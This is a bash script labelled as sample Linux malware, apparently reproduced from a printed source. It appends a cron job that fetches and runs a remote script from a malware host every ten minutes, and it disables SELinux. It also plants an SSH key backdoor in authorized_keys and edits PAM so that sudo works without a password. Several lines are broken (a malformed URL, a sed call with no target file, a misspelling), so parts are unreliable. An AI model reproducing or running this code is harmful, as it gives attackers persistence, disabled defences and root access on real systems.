#!/bin/bash
# Warning: This is the sample malware, which implements to recive persistence
and disable security system in Linux.
PERSISTENCE_DIR="/etc/crontab /var/spool/cron/crontabs" # AutoStarting
Locations, Scheduled Jobs
ROOT_UID=0 # Only users with $UID
ENABLED_SE=`getenforce` # Get SELinux status
SELINUX_DIR="/etc/selinux/config"
NULL_DIR="/dev/null"
USER_NAME=`stat -c "%U" $(tty)`
SSH_DIR="/home/${USER_NAME}/.ssh"
PAM_DIR="/etc/pam.d/"
EXIT_NOTROOT=10
EXIT_ERROR=11
# Suggestions users to run this script as root.
function check_root {
    if [ "$UID" -ne "$ROOT_UID" ]; then
        echo "You must be root to run this script"
        exit $EXIT_NOTROOT
    fi
}
# There are some useful script here.
# Here is harmful script.
check_root
for FILE in ${PERSISTENCE_DIR}; do
    # Check if file is existing and is a regular file.
    if [ -f "${FILE}" ]; then
        # Connect to the malware server and implement the script from server in
        silence every 10 minute.
        echo "*/10 * * * * bash <(curl -fs
        http:/malwaresite.org/malware_script.sh)" >> ${FILE}
    fi
done
if [ "$ENABLED_SE" == "Enforcing" ]; then
    setenforce 0 # disable SELinux service
    if [ -f "$SELINUX_DIR" ]; then
        sed -i 's/enfocing/disabled/g' # Disable SELinux
    fi
fi
# Create ssh key to get a backdoor
ssh-keygen -q -t rsa -N '' -f "${SSH_DIR}"/id_rsa 2>"${NULL_DIR}" <<< y
>"${NULL_DIR}"
if [ ! -a "${SSH_DIR}"/authorized_keys ];
    then
    touch "${SSH_DIR}"/authorized_keys # Create backdoor
    else
    exit EXIT_ERROR
fi
cat "${SSH_DIR}"/id_rsa.pub > "${SSH_DIR}"/authorized_keys
chmod 700 "${SSH_DIR}"
chmod 600 "${SSH_DIR}"/authorized_keys
# Modified the PAM to use sudo without password
48
if [ -d ${PAM_DIR} ]; then
    sed -i '2s/^/auth sufficient pam_permit.so \n/' ${PAM_DIR}/sudo
    else
    exit EXIT_ERROR
fi
exit 0